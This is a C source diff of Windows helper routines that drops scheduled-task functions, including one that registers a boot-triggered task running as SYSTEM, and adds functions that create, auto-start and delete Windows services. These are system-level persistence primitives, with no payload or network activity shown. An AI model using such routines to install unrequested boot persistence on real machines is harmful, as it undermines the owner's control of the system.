@@ -2,7 +2,6 @@
 #include <Psapi.h>
 #include <Shlwapi.h>
 #include <aclapi.h>
-#include <taskschd.h>
 #include <wchar.h>
 
 BOOL GetRandomBytes(LPVOID buffer, DWORD size)
@@ -110,7 +109,7 @@ PWCHAR Int32ToStrW(LONG value, PWCHAR buffer)
 
 BOOL Is64BitOperatingSystem()
 {
-	BOOL wow64 = FALSE;
+	BOOL wow64;
 	return BITNESS(64) || IsWow64Process(GetCurrentProcess(), &wow64) && wow64;
 }
 BOOL IsAtLeastWindows10()
@@ -459,227 +458,49 @@ BOOL ExecuteFile(LPCWSTR path, BOOL deleteFile)
 
 	return result;
 }
-BOOL CreateScheduledTask(LPCWSTR name, LPCWSTR directory, LPCWSTR fileName, LPCWSTR arguments)
+BOOL CreateWindowsService(LPCWSTR name, LPCWSTR binPath)
 {
 	BOOL result = FALSE;
 
-	BSTR nameBstr = SysAllocString(name);
-	BSTR directoryBstr = SysAllocString(directory);
-	BSTR fileNameBstr = SysAllocString(fileName);
-	BSTR argumentsBstr = SysAllocString(arguments);
-	BSTR folderPathBstr = SysAllocString(L"\\");
-	BSTR userIdBstr = SysAllocString(L"SYSTEM");
-
-	if (SUCCEEDED(CoInitializeEx(NULL, COINIT_MULTITHREADED)))
+	SC_HANDLE serviceManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+	if (serviceManager)
 	{
-		HRESULT initializeSecurityResult = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
-		if (SUCCEEDED(initializeSecurityResult) || initializeSecurityResult == RPC_E_TOO_LATE)
+		SC_HANDLE service = CreateServiceW(serviceManager, name, NULL, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, binPath, NULL, NULL, NULL, NULL, NULL);
+		if (service)
 		{
-			ITaskService *service = NULL;
-			if (SUCCEEDED(CoCreateInstance((LPCLSID)&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, (LPCLSID)&IID_ITaskService, (LPVOID*)&service)))
+			if (StartServiceW(service, 0, NULL))
 			{
-				VARIANT empty;
-				VariantInit(&empty);
-
-				if (SUCCEEDED(service->lpVtbl->Connect(service, empty, empty, empty, empty)))
-				{
-					ITaskFolder *folder = NULL;
-					if (SUCCEEDED(service->lpVtbl->GetFolder(service, folderPathBstr, &folder)))
-					{
-						ITaskDefinition *task = NULL;
-						if (SUCCEEDED(service->lpVtbl->NewTask(service, 0, &task)))
-						{
-							ITaskSettings *settings = NULL;
-							if (SUCCEEDED(task->lpVtbl->get_Settings(task, &settings)))
-							{
-								if (SUCCEEDED(settings->lpVtbl->put_StartWhenAvailable(settings, VARIANT_TRUE)) &&
-									SUCCEEDED(settings->lpVtbl->put_DisallowStartIfOnBatteries(settings, VARIANT_FALSE)))
-								{
-									ITriggerCollection *triggerCollection = NULL;
-									if (SUCCEEDED(task->lpVtbl->get_Triggers(task, &triggerCollection)))
-									{
-										ITrigger *trigger = NULL;
-										if (SUCCEEDED(triggerCollection->lpVtbl->Create(triggerCollection, TASK_TRIGGER_BOOT, &trigger)))
-										{
-											IBootTrigger *bootTrigger = NULL;
-											if (SUCCEEDED(trigger->lpVtbl->QueryInterface(trigger, (LPCLSID)&IID_IBootTrigger, (LPVOID*)&bootTrigger)))
-											{
-												IActionCollection *actionCollection = NULL;
-												if (SUCCEEDED(task->lpVtbl->get_Actions(task, &actionCollection)))
-												{
-													IAction *action = NULL;
-													if (SUCCEEDED(actionCollection->lpVtbl->Create(actionCollection, TASK_ACTION_EXEC, &action)))
-													{
-														IExecAction *execAction = NULL;
-														if (SUCCEEDED(action->lpVtbl->QueryInterface(action, (LPCLSID)&IID_IExecAction, (LPVOID*)&execAction)))
-														{
-															if (SUCCEEDED(execAction->lpVtbl->put_WorkingDirectory(execAction, directoryBstr)) &&
-																SUCCEEDED(execAction->lpVtbl->put_Path(execAction, fileNameBstr)) &&
-																SUCCEEDED(execAction->lpVtbl->put_Arguments(execAction, argumentsBstr)))
-															{
-																VARIANT password;
-																VariantInit(&password);
-
-																VARIANT userId;
-																VariantInit(&userId);
-																userId.vt = VT_BSTR;
-																userId.bstrVal = userIdBstr;
-
-																VARIANT sddl;
-																VariantInit(&sddl);
-
-																IRegisteredTask *registeredTask = NULL;
-																HRESULT hr = folder->lpVtbl->RegisterTaskDefinition(folder, nameBstr, task, TASK_CREATE_OR_UPDATE, userId, password, TASK_LOGON_SERVICE_ACCOUNT, sddl, &registeredTask);
-																if (SUCCEEDED(hr))
-																{
-																	result = TRUE;
-
-																	registeredTask->lpVtbl->Release(registeredTask);
-																}
-															}
-
-															execAction->lpVtbl->Release(execAction);
-														}
-
-														action->lpVtbl->Release(action);
-													}
-
-													actionCollection->lpVtbl->Release(actionCollection);
-												}
-
-												bootTrigger->lpVtbl->Release(bootTrigger);
-											}
-
-											trigger->lpVtbl->Release(trigger);
-										}
-
-										triggerCollection->lpVtbl->Release(triggerCollection);
-									}
-								}
-
-								settings->lpVtbl->Release(settings);
-							}
-
-							task->lpVtbl->Release(task);
-						}
-
-						folder->lpVtbl->Release(folder);
-					}
-				}
-
-				service->lpVtbl->Release(service);
+				result = TRUE;
 			}
+
+			CloseServiceHandle(service);
 		}
 
-		CoUninitialize();
+		CloseServiceHandle(serviceManager);
 	}
-
-	SysFreeString(nameBstr);
-	SysFreeString(directoryBstr);
-	SysFreeString(fileNameBstr);
-	SysFreeString(argumentsBstr);
-	SysFreeString(folderPathBstr);
-	SysFreeString(userIdBstr);
 
 	return result;
 }
-BOOL RunScheduledTask(LPCWSTR name)
+BOOL DeleteWindowsService(LPCWSTR name)
 {
 	BOOL result = FALSE;
 
-	BSTR nameBstr = SysAllocString(name);
-	BSTR folderPathBstr = SysAllocString(L"\\");
-
-	if (SUCCEEDED(CoInitializeEx(NULL, COINIT_MULTITHREADED)))
+	SC_HANDLE serviceManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+	if (serviceManager)
 	{
-		HRESULT initializeSecurityResult = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
-		if (SUCCEEDED(initializeSecurityResult) || initializeSecurityResult == RPC_E_TOO_LATE)
+		SC_HANDLE service = OpenServiceW(serviceManager, name, SC_MANAGER_ALL_ACCESS);
+		if (service)
 		{
-			ITaskService *service = NULL;
-			if (SUCCEEDED(CoCreateInstance((LPCLSID)&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, (LPCLSID)&IID_ITaskService, (LPVOID*)&service)))
+			if (DeleteService(service))
 			{
-				VARIANT empty;
-				VariantInit(&empty);
-
-				if (SUCCEEDED(service->lpVtbl->Connect(service, empty, empty, empty, empty)))
-				{
-					ITaskFolder *folder = NULL;
-					if (SUCCEEDED(service->lpVtbl->GetFolder(service, folderPathBstr, &folder)))
-					{
-						IRegisteredTask *task = NULL;
-						if (SUCCEEDED(folder->lpVtbl->GetTask(folder, nameBstr, &task)))
-						{
-							VARIANT params;
-							VariantInit(&params);
-
-							IRunningTask *runningTask = NULL;
-							if (SUCCEEDED(task->lpVtbl->Run(task, params, &runningTask)))
-							{
-								result = TRUE;
-
-								runningTask->lpVtbl->Release(runningTask);
-							}
-
-							task->lpVtbl->Release(task);
-						}
-
-						folder->lpVtbl->Release(folder);
-					}
-				}
-
-				service->lpVtbl->Release(service);
+				result = TRUE;
 			}
+
+			CloseServiceHandle(service);
 		}
 
-		CoUninitialize();
+		CloseServiceHandle(serviceManager);
 	}
-
-	SysFreeString(nameBstr);
-	SysFreeString(folderPathBstr);
-
-	return result;
-}
-BOOL DeleteScheduledTask(LPCWSTR name)
-{
-	BOOL result = FALSE;
-
-	BSTR nameBstr = SysAllocString(name);
-	BSTR folderPathBstr = SysAllocString(L"\\");
-
-	if (SUCCEEDED(CoInitializeEx(NULL, COINIT_MULTITHREADED)))
-	{
-		HRESULT initializeSecurityResult = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
-		if (SUCCEEDED(initializeSecurityResult) || initializeSecurityResult == RPC_E_TOO_LATE)
-		{
-			ITaskService *service = NULL;
-			if (SUCCEEDED(CoCreateInstance((LPCLSID)&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, (LPCLSID)&IID_ITaskService, (LPVOID*)&service)))
-			{
-				VARIANT empty;
-				VariantInit(&empty);
-
-				if (SUCCEEDED(service->lpVtbl->Connect(service, empty, empty, empty, empty)))
-				{
-					ITaskFolder *folder = NULL;
-					if (SUCCEEDED(service->lpVtbl->GetFolder(service, folderPathBstr, &folder)))
-					{
-						if (SUCCEEDED(folder->lpVtbl->DeleteTask(folder, nameBstr, 0)))
-						{
-							result = TRUE;
-						}
-
-						folder->lpVtbl->Release(folder);
-					}
-				}
-
-				service->lpVtbl->Release(service);
-			}
-		}
-
-		CoUninitialize();
-	}
-
-	SysFreeString(nameBstr);
-	SysFreeString(folderPathBstr);
 
 	return result;
 }
